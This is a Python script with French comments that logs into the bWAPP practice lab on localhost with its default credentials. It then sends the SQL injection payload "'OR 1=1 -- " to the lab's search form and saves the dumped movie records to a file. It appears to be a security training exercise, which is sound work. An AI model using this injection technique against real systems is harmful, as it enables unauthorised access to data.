import requests
from bs4 import BeautifulSoup

# URL du formulaire de connexion
login_url = 'http://localhost/bWAPP/login.php'

# Identifiants de connexion
username = 'bee'
password = 'bug'

# Création de la session
session = requests.Session()

# Données du formulaire de connexion
data = {
    'login': username,
    'password': password,
    'security_level': 0,  # Niveau de sécurité (si applicable)
    'form': 'submit'
}

# Envoi de la requête POST pour se connecter
response = session.post(login_url, data=data)

# Vérification de la connexion réussie
if 'Welcome' in response.text:
    print('Connexion réussie !')
else:
    print('Échec de la connexion.')



response = session.get('http://localhost/bWAPP/sqli_1.php')

# Vérification de la réponse
if response.status_code == 200:
    # Analyse du HTML de la page avec BeautifulSoup
    soup = BeautifulSoup(response.text, 'html.parser')

    # Recherche du formulaire de recherche
    form = soup.find('form')

    # Extraction de l'action et de la méthode du formulaire
    action = form.get('action')
    
    method = form.get('method')
    
    
    # Construction de l'URL complète du formulaire
    form_url = "http://localhost" + action

    # Recherche du champ de saisie de recherche
    search_field = form.find('input', {'name': 'title'})
    

    # Construction des données du formulaire
    form_data = {search_field["name"]: "'OR 1=1 -- "}
    

    # Envoi de la requête GET avec les données du formulaire
    response = session.get(form_url, params=form_data)
    
    # Vérification de la réponse de la recherche
    if response.status_code == 200:
        # Analyse du HTML de la page de résultats avec BeautifulSoup
        results_soup = BeautifulSoup(response.text, 'html.parser')
    
        # Extraction des résultats de la table
        table = results_soup.find(id="table_yellow")
        
        rows = table.find_all('tr')
        with open('results.txt', 'w') as f:
                    # Traitez les données des résultats ici

            for row in rows[1:]:  # Ignorer la première ligne d'en-tête
                cells = row.find_all('td')
                title = cells[0].text.strip()
                release = cells[1].text.strip()
                character = cells[2].text.strip()
                genre = cells[3].text.strip()
                imdb = cells[4].text.strip()
                
                f.write('Titre: ' + title + '\n')
                f.write('Sortie: ' + release + '\n')
                f.write('Personnage: ' + character + '\n')
                f.write('Genre: ' + genre + '\n')
                f.write('IMDb: ' + imdb + '\n')
                f.write('\n')


    else:
        print('La requête GET de recherche a échoué avec le code :', response.status_code)
else:
    print('La requête GET pour la page de recherche a échoué avec le code :', response.status_code)
